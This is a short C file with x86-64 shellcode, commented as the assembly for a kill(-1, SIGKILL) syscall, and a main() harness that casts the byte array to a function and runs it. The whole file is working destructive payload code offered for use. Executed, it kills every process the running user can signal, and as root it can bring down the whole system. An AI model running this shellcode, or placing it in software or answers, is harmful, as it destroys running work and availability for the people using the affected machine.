/*
this shellcode will kill all procceses 
global _start

section .text

_start:
	

	push 	0x3e		; sys kill
	pop  	rax
	push 	-1 			; pid
	pop		rdi
	push	0x9			; sig kill
	pop 	rsi
	syscall
  
  */
  
#include <stdio.h>
#include <string.h>

unsigned char code[] =  "\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05";

int
main() {

printf("Shellcode Length:  %d\n", (int)strlen(code));
int (*ret)() = (int(*)())code;
ret();

return 0;
}
